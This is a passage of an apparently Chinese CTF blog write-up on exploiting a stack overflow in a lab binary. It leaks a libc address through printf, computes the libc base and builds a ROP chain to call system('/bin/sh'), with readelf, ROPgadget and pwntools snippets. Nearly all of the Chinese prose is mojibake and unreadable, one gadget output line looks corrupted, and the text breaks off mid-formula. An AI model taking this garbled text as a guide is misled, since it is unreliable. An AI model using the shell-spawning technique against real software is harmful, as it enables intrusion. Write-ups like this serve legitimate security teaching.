<p>æŸ¥æ‰¾ä¸€ä¸‹ <code>read@got</code> çš„åœ°å€ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r ./pwn | grep <span class="built_in">read</span>  æˆ– objdump -R ./demo</span><br><span class="line">000000003fb0  R_X86_64_JUMP_SLO 0000000000000000 <span class="built_in">read</span>@GLIBC_2.2.5 + 0</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œ <code>0x3fb0</code> æ˜¯ <code>read@got</code> è¿™ä¸€é¡¹<strong>åœ¨è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„åœ°å€</strong> ã€‚å®ƒçš„<strong>åˆå§‹å†…å®¹ï¼ˆå€¼ï¼‰æ˜¯ä¸€ä¸ªå‡½æ•°åœ°å€</strong>ï¼ŒæŒ‡å‘æ‡’ç»‘å®šè§£æå™¨ï¼Œæ¯”å¦‚ <code>ld.so</code> çš„ <code>_dl_runtime_resolve</code>ã€‚ç¬¬ä¸€æ¬¡è°ƒç”¨ <code>read@plt</code>ï¼Œè§£æå™¨è§£æç¬¦å·å¹¶æ›´æ–° <code>0x3fb0</code> çš„å†…å®¹ä¸º <code>libc</code> ä¸­ <code>read()</code> çš„çœŸå®åœ°å€ï¼Œæ¯”å¦‚ <code>0x7ffff7d12345</code>ã€‚å…·ä½“è§£æè¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[è°ƒç”¨ read@plt]</span><br><span class="line">   â†“</span><br><span class="line">jmp *[read@got]  â† é—´æ¥è·³è½¬</span><br><span class="line">       â†“</span><br><span class="line">     å¦‚æœé¦–æ¬¡è°ƒç”¨ â†’ ld.so è§£æç¬¦å· â†’ æŠŠ libc ä¸­ read çš„åœ°å€å†™å…¥ read@got</span><br><span class="line">     å¦åˆ™        â†’ ç›´æ¥è·³åˆ° libc ä¸­çš„ read å‡½æ•°</span><br></pre></td></tr></table></figure>
<p>å‡½æ•°å’Œå‚æ•°éƒ½å·²é½å…¨ï¼Œæ¥ä¸‹æ¥éœ€è¦è€ƒè™‘å¦‚ä½•ä¼ å‚ã€‚x86-64 ABI è§„å®šç¬¬ä¸€ä¸ªå‚æ•°ç”¨<code>rdi</code>æ¥ä¼ é€’ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å¯æ‰§è¡Œç¨‹åºä¸­æ‰¾åˆ°ä¸€ç§ <code>Gadget</code>ï¼Œå½¢å¦‚ <code>pop rdi ; ret</code>ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ„é€ å¦‚ä¸‹çš„ ROP é“¾ï¼š</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ ˆç”±ä¸Šå¾€ä¸‹åœ°å€å‡å°</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|      <span class="selector-tag">puts</span>@<span class="selector-tag">plt</span> (<span class="number">0</span>x1120)     | â† è°ƒç”¨ <span class="selector-tag">puts</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|      <span class="number">0</span><span class="selector-tag">x3fb0</span> (read<span class="variable">@got</span>)     | â† å‚æ•°</span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">| <span class="selector-tag">pop</span> <span class="selector-tag">rdi</span> ; <span class="selector-tag">ret</span>  <span class="selector-tag">Gadget</span> <span class="selector-tag">addr</span> | â† æ§åˆ¶ <span class="selector-tag">rdi</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|       <span class="selector-tag">old</span> <span class="selector-tag">rbp</span> <span class="selector-tag">value</span>        | </span><br><span class="line">+<span class="selector-tag">----------------------------</span>+ â†  %<span class="selector-tag">rbp</span></span><br></pre></td></tr></table></figure>
<p>ROP é“¾è®¾è®¡å®Œæ¯•ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æœ€åä¸€æ­¥ï¼Œæ‰¾åˆ° <code>Gadget</code>ï¼ä½†ä»¤äººé—æ†¾çš„æ˜¯ï¼Œæˆ‘æ‰¾éäº†æ•´ä¸ª executable è¿æ¯”è¾ƒåˆé€‚çš„éƒ½æ²¡æœ‰ï¼Œæ›´ä¸ç”¨è¯´å®Œç¾çš„ <code>pop rdi ; ret</code>äº†ã€‚ä¸‹é¢æ‰¾çš„æ˜¯ä¸¤ä¸ªæœ€å¯èƒ½åˆé€‚çš„ï¼Œä½†æ˜¯ <code>rip</code>çš„å€¼ä¸åœ¨æˆ‘ä»¬çš„æ§åˆ¶èŒƒå›´å†…ï¼Œå› æ­¤è¿™ä¸ªæƒ³æ³•å€’åœ¨äº†æœ€åä¸€æ­¥ä¸Šã€‚OUT</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000000012</span>c3 &lt;vuln&gt;:</span><br><span class="line">    <span class="number">1318</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">42</span> <span class="number">0</span>d <span class="number">00</span> <span class="number">00</span> 	lea    <span class="number">0xd42</span>(%rip),%rax        # <span class="number">2061</span> &lt;_IO_stdin_used+<span class="number">0x61</span>&gt;</span><br><span class="line">    <span class="number">131f</span>:	<span class="number">48</span> <span class="number">89</span> c7             	mov    %rax,%rdi</span><br><span class="line">    <span class="number">1322</span>:	e8 f9 fd ff ff       	call   <span class="number">1120</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">    <span class="number">1327</span>:	<span class="number">48</span> <span class="number">8b</span> <span class="number">15</span> <span class="number">42</span> <span class="number">2</span>d <span class="number">00</span> <span class="number">00</span> 	mov    <span class="number">0x2d42</span>(%rip),%rdx</span><br><span class="line">    <span class="number">1355</span>:	<span class="number">48</span> <span class="number">83</span> f8 <span class="number">10</span>          	cmp    $<span class="number">0x10</span>,%rax</span><br><span class="line">    <span class="number">1359</span>:	<span class="number">76</span> <span class="number">25</span>                	jbe    <span class="number">1380</span> &lt;vuln+<span class="number">0xbd</span>&gt;</span><br><span class="line">    <span class="number">135b</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">1</span>e <span class="number">0</span>d <span class="number">00</span> <span class="number">00</span> 	lea    <span class="number">0xd1e</span>(%rip),%rax        # <span class="number">2080</span> &lt;_IO_stdin_used+<span class="number">0x80</span>&gt;</span><br><span class="line">    <span class="number">1362</span>:	<span class="number">48</span> <span class="number">89</span> c7             	mov    %rax,%rdi</span><br><span class="line">    <span class="number">1365</span>:	e8 b6 fd ff ff       	call   <span class="number">1120</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="è¯»å–æ ˆå­˜ç•™çš„-libc-å‡½æ•°è°ƒç”¨ä¿¡æ¯"><a class="markdownIt-Anchor" href="#è¯»å–æ ˆå­˜ç•™çš„-libc-å‡½æ•°è°ƒç”¨ä¿¡æ¯"></a> è¯»å–æ ˆå­˜ç•™çš„ libc å‡½æ•°è°ƒç”¨ä¿¡æ¯</h3>
<p>æ—¢ç„¶æ— æ³•é€šè¿‡ puts æ¥è·å¾—åŸºå€ï¼Œç¬¬äºŒæ¬¡å°è¯•è¯»å–åœ¨<strong>mainæ ˆå¸§</strong>ä¸­å­˜ç•™çš„å…³äº libc çš„åœ°å€ä¿¡æ¯ã€‚è·å¾—libcçš„ä¿¡æ¯åå°è¯•å¾—åˆ° libc çš„åŸºå€ï¼Œæœ‰äº†åŸºå€åæˆ‘ä»¬å°±å¯ä»¥å¾ˆè½»æ¾åœ°æ‰¾åˆ°libcä¸­ <code>pop rdi; ret;</code> çš„ gadgetï¼ŒæŠŠ<code>&quot;/bin/sh&quot;</code>çš„è¿è¡Œæ—¶åœ°å€ pop åˆ° rdiï¼Œç„¶åè·³è½¬åˆ° systemã€‚</p>
<p>ä¸€å¼€å§‹çš„æ€è·¯å¤šäº†ä¸€ä¸ªè®¡ç®—ç¨‹åºè¿è¡ŒåŸºå€çš„é˜¶æ®µï¼Œå…¶å®æ²¡æœ‰å¿…è¦ï¼š</p>
<ol>
<li><strong>Stage 1</strong>ï¼šæ³„éœ²æ ˆé‡‘ä¸é›€</li>
<li><s><strong>Stage 2</strong>ï¼šæ³„éœ² <code>main</code> å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè®¡ç®— Executable åŸºåœ°å€ã€‚</s></li>
<li><strong>Stage 3</strong>ï¼šæ³„éœ² Libc çš„è¿è¡Œæ—¶åœ°å€ï¼Œè®¡ç®— Libc åŸºåœ°å€ã€‚</li>
<li><strong>Stage 4</strong>ï¼šæ„é€ æœ€ç»ˆ ROP é“¾ï¼Œä½¿ç”¨ Libc gadget è°ƒç”¨ <code>system(&quot;/bin/sh&quot;)</code>ã€‚**</li>
</ol>
<p><strong>è¿™ä¸ªæ€è·¯çš„é‡ç‚¹åœ¨äºè¯»å–æ ˆä¸Šæ®‹ç•™çš„ libc ä¿¡æ¯ï¼Œå¹¶åˆ†æè¿™ä¸ªä¿¡æ¯æ¥è®¡ç®—å…¶åœ¨ libc ä¸­çš„åç§»é‡ï¼Œä»è€Œå¾—åˆ° libc è¿è¡ŒåŸºå€ã€‚</strong></p>
<p>å…ˆå‡†å¤‡ä¸€ä¸‹ ROP è°ƒç”¨é“¾éœ€è¦çš„ä¸œè¥¿ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥æ‰¾ä¸€ä¸ª Gatget å…¥å£åœ°å€</span></span><br><span class="line">$ ROPgadget --binary libc.so.6 --only <span class="string">&quot;pop|ret&quot;</span> | grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line">0x000000000002a3e5 : pop ret ; ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># system å‡½æ•°å…¥å£åœ°å€</span></span><br><span class="line">$ nm -D libc.so.6 | grep system</span><br><span class="line">0000000000050d70 T __libc_system@@GLIBC_PRIVATE</span><br><span class="line"></span><br><span class="line"><span class="comment"># /bin/sh å­—ç¬¦ä¸²å­—é¢é‡åœ°å€</span></span><br><span class="line">$ strings -a -t x libc.so.6 | grep <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"> 1d8678 /bin/sh</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯è¦è·³è¿‡ <code>endbr64</code>ï¼Œæ‰€ä»¥å®é™…çš„ system å…¥å£åœ°å€åç§»é‡ä¸º <code>0x50d74</code> ã€‚</p>
<p>ç°åœ¨è¯¦ç»†æ‹†è§£ Stage 3 çš„è¿‡ç¨‹ï¼š</p>
<p>ç”±äºæˆ‘ä»¬å‘ç° Executable ä¸­ä¼¼ä¹ç¼ºå°‘æ–¹ä¾¿çš„ <code>pop rdi; ret;</code> æˆ–ç±»ä¼¼ gadget æ¥æ„å»ºæ ‡å‡†çš„ <code>puts(read@got)</code> æ³„éœ²é“¾ï¼Œæˆ‘ä»¬å°†åˆ©ç”¨ <code>vuln</code> å‡½æ•°ä¸­ <code>read(0, buf, 0x408)</code> å’Œ <code>printf(&quot;01 %16s ... %ds\n\n&quot;, buf, last)</code> çš„å·¨å¤§æº¢å‡ºå’Œæ‰“å°ç‰¹æ€§æ¥æ³„éœ² Libc åœ°å€ã€‚</p>
<p>å› æ­¤æˆ‘ä»¬å°†åœ¨ç¬¬ä¸‰æ¬¡è¾“å…¥æ—¶ä¸æ–­å°è¯•å‘é€ç²¾å¿ƒæ„é€ çš„ payloadã€‚è¿™ä¸ª payload çš„é•¿åº¦éœ€ <strong>é•¿åº¦è¶³å¤Ÿå¤§ï¼Œä»¥æº¢å‡ºåˆ° <code>main</code> å‡½æ•°çš„æ ˆå¸§ç”šè‡³æ›´é«˜åœ°å€ï¼š</strong> è¿™éƒ¨åˆ†æº¢å‡ºçš„æ•°æ®æœ¬èº«ä¸é‡è¦ï¼Œé‡è¦çš„æ˜¯å®ƒä¼šå¯¼è‡´ <code>printf</code> åœ¨æ‰“å°å®Œå›ºå®šæ ¼å¼çš„å†…å®¹åï¼Œç»§ç»­ä»æº¢å‡ºæ‰€åˆ°è¾¾çš„æ ˆå†…å­˜åŒºåŸŸè¯»å–å¹¶æ‰“å°æ•°æ®ã€‚</p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œ<strong>æ ˆä¸Šå¯èƒ½å­˜æœ‰å“ªäº› Libc ä¿¡æ¯ï¼Ÿ</strong></p>
<p>å½“ <code>main</code> å‡½æ•°è°ƒç”¨ <code>vuln</code> æ—¶ï¼Œ<code>main</code> å‡½æ•°çš„æ ˆå¸§ä½äº <code>vuln</code> å‡½æ•°çš„æ ˆå¸§ä¹‹ä¸Šã€‚<code>main</code> å‡½æ•°åœ¨è°ƒç”¨ <code>vuln</code> ä¹‹å‰å’Œä¹‹åï¼Œè¿˜ä¼šè°ƒç”¨è®¸å¤šå…¶ä»–çš„ Libc å‡½æ•°ï¼Œä¾‹å¦‚ <code>setvbuf</code>ã€<code>printf</code>ã€<code>time</code>ã€<code>scanf</code>ã€<code>toupper</code>ã€<code>exit</code> ç­‰ã€‚åœ¨è¿™äº›å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œ<code>main</code> å‡½æ•°çš„æ ˆå¸§ä¸Šå¯èƒ½ä¼šå­˜æ”¾ä»¥ä¸‹ä¸ Libc ç›¸å…³çš„ä¿¡æ¯ï¼š</p>
<ul>
<li><strong>ä» Libc å‡½æ•°è¿”å›çš„åœ°å€</strong>ï¼šè¿™ä¸ªåœ°å€å¯èƒ½å°±æ˜¯ libc å‡½æ•°ä¸­ä¸€ä¸ªæŒ‡ä»¤çš„å®é™…åœ°å€</li>
<li><strong>æŒ‡å‘ Libc æ•°æ®ç»“æ„çš„æŒ‡é’ˆï¼š</strong> ä¾‹å¦‚ï¼Œ<code>setvbuf</code> å‡½æ•°ä¼šæ“ä½œ <code>stdin</code>ã€<code>stdout</code>ã€<code>stderr</code> è¿™äº› <code>FILE</code> ç»“æ„ä½“ã€‚<code>main</code> å‡½æ•°çš„å±€éƒ¨å˜é‡æˆ–ä¼ é€’ç»™å…¶ä»–å‡½æ•°çš„å‚æ•°ä¸­ï¼Œå¯èƒ½ä¿å­˜ç€æŒ‡å‘è¿™äº›ä½äº Libc æ•°æ®æ®µçš„ <code>FILE</code> ç»“æ„ä½“çš„æŒ‡é’ˆã€‚</li>
<li><strong>Libc å‡½æ•°åœ¨ GOT è¡¨ä¸­çš„è¿è¡Œæ—¶åœ°å€çš„æ‹·è´ (å¯èƒ½æ€§è¾ƒä½ï¼Œé™¤éæœ‰ç‰¹å®šä»£ç è¿™æ ·åš)ã€‚</strong></li>
</ul>
<p>ä¸ºäº†ä» Stage 3 çš„è¾“å‡ºæ¥è§£æå‡ºè¿™äº›åœ°å€ã€‚å…³é”®åœ¨äº<strong>è¯†åˆ«åœ°å€æ¨¡å¼ï¼š</strong> åœ¨ 64 ä½ Linux ç³»ç»Ÿä¸­ï¼ŒLibc çš„åœ°å€é€šå¸¸ä»¥ <code>0x7f</code> å¼€å¤´ï¼ˆæˆ–è€…ä»¥ <code>0x7f</code> ä½œä¸ºå…¶ 8 å­—èŠ‚è¡¨ç¤ºçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼‰ã€‚åœ¨è§£æè¾“å‡ºæ—¶ï¼Œå¯»æ‰¾ä»¥ <code>\x7f</code> ç»“å°¾çš„ 8 å­—èŠ‚åºåˆ—ï¼Œè¿™äº›å¾ˆå¯èƒ½æ˜¯ Libc çš„åœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸æ–­å®éªŒè¾“å…¥ <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>â‰¡</mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mn>8</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">size â‰¡ 0(mod 8)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord">8</span><span class="mclose">)</span></span></span></span> çš„payloadï¼Œçœ‹çœ‹æº¢å‡ºç»“æœä¼šä¸ä¼šç¬¦åˆåœ°å€è¦æ±‚ã€‚</p>
<p>æˆ‘ä»¬ä¸çŸ¥é“åœ¨æ ˆä¸Šå“ªä¸ªä½ç½®ä¼šæœ‰ libc å‡½æ•°ä¿¡æ¯ï¼Œä¹Ÿä¸çŸ¥é“è¿™ä¸ªä¿¡æ¯æ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥éœ€è¦ä¸æ–­å°è¯•ï¼‹çŒœæµ‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test.py æœ¬åœ°æµ‹è¯•executable</span></span><br><span class="line">libc_line = r.recvline() <span class="comment"># æ¥æ”¶æ‰“å° padding åçš„å€¼</span></span><br><span class="line">log.info(<span class="string">f&quot;æ¥æ”¶åˆ°çš„ libc è¡Œ: <span class="subst">&#123;libc_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">end_index = libc_line.index(<span class="number">0x20</span>) Â <span class="comment"># æ‰¾åˆ°ç¬¬ä¸€ä¸ª 0x20 çš„ä½ç½®</span></span><br><span class="line"><span class="keyword">if</span> end_index == <span class="number">0</span>:</span><br><span class="line">	log.error(<span class="string">&quot;libc è¡Œä¸ºç©ºï¼æ²¡èƒ½è¯»åˆ°ç›¸å…³ä¿¡æ¯&quot;</span>)</span><br><span class="line">libc_partial_bytes = libc_line[:end_index]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¡«å……åˆ°8å­—èŠ‚ï¼Œä¸è¶³éƒ¨åˆ†ç”¨0x00è¡¥é½</span></span><br><span class="line">libc_bias = libc_partial_bytes.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;æˆåŠŸæå–åˆ°éƒ¨åˆ†çš„ libc æŒ‡ä»¤åœ°å€ä¸º: <span class="subst">&#123;libc_partial_bytes&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;é‡æ„å®Œæ•´çš„ libc æŒ‡ä»¤åœ°å€: <span class="subst">&#123;<span class="built_in">int</span>.from_bytes(libc_bias, byteorder=<span class="string">&#x27;little&#x27;</span>):#x&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(libc_bias) != <span class="number">8</span>:</span><br><span class="line">	 log.warning(<span class="string">f&quot;é‡æ„åçš„ libc åœ°å€é•¿åº¦ä¸æ˜¯ 8 (<span class="subst">&#123;<span class="built_in">len</span>(libc_bias)&#125;</span>)ï¼&quot;</span>)</span><br><span class="line">	 log.info(<span class="string">f&quot;è¿”å›åœ°å€è¡Œæ‰€æœ‰å­—èŠ‚ (hex): <span class="subst">&#123;libc_line.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;/proc/<span class="subst">&#123;pid&#125;</span>/maps&#x27;</span>) <span class="keyword">as</span> maps_file:</span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> maps_file:</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;libc&#x27;</span> <span class="keyword">in</span> line <span class="keyword">and</span> <span class="string">&#x27;r--p&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">			addr = <span class="built_in">int</span>(line.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">			log.success(<span class="string">f&quot;é€šè¿‡ç³»ç»ŸæŸ¥çœ‹ libc åŸºåœ°å€ä¸º: <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&quot;</span>)</span><br><span class="line">			libc_base_addr =addr</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>é€šè¿‡ä¸æ–­åœ°æµ‹è¯•ï¼Œåœ¨å‘é€ 32 + 7 * 8= 88 å­—èŠ‚ payload æ—¶ï¼Œå¾—åˆ°äº†ä¸€ä¸ª <code>0x7f</code> å¼€å¤´çš„åœ°å€ï¼Œå¯¹æ¯”æµ‹è¯•æ—¶å…·ä½“çš„ libc åœ°å€ï¼Œå¾—åˆ°è¿™ä¸ª libc æŒ‡ä»¤çš„åç§»é‡ä¸º <code>0x29d90</code>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">29d90: Â  Â 89 c7 Â  Â  Â mov Â  Â %eax,%edi</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯¹è¿™ä¸ªåç§»é‡è¿›è¡Œå°è¯•ï¼Œåœ¨å®é™…çš„è„šæœ¬ä¸­å‘é€åŒæ ·å¤§å°çš„ payloadï¼Œå¾—åˆ°å®é™… libc æŒ‡ä»¤åœ°å€å†å‡å»åç§»é‡å°±èƒ½å¾—åˆ° libc åŠ è½½çš„åŸºå€äº†ï¼š</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi><mi>i</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">_</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>i</mi><mi>n</mi><mi>t</mi><mo stretchy="false">(</mo><mi>i</mi><mi>n</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>u</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo stretchy="false">)</mo><mo>âˆ’</mo><mi>L</mi><mi>I</mi><mi>B</mi><mi>C</mi><mi mathvariant="normal">_</mi><mi>O</mi><mi>F</mi><mi>F</mi><mi>S</mi><mi>E</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">libc\_base\_addr = int(instruction\_addr) - LIBC\_OFFSET
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p>
<p>æœ‰äº† Libc åŸºå€åï¼Œæˆ‘ä»¬æ ¹æ®åç§»é‡è®¡ç®—æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿çš„å®é™…è¿è¡Œæ—¶åœ°å€ï¼š</p>
<ol>
<li><strong>è®¡ç®— Libc ä¸­ Gadget çš„è¿è¡Œæ—¶åœ°å€ï¼š</strong></li>
</ol>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>o</mi><mi>p</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>d</mi><mi>i</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mi>t</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>l</mi><mi>i</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">_</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>+</mo><mi>P</mi><mi>O</mi><mi>P</mi><mi mathvariant="normal">_</mi><mi>R</mi><mi>D</mi><mi>I</mi><mi mathvariant="normal">_</mi><mi>O</mi><mi>F</mi><mi>F</mi><mi>S</mi><mi>E</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">pop\_rdi\_retaddr = libc\_base\_addr + POP\_RDI\_OFFSET
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">o</span><span class="mord mathdefault">p</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" 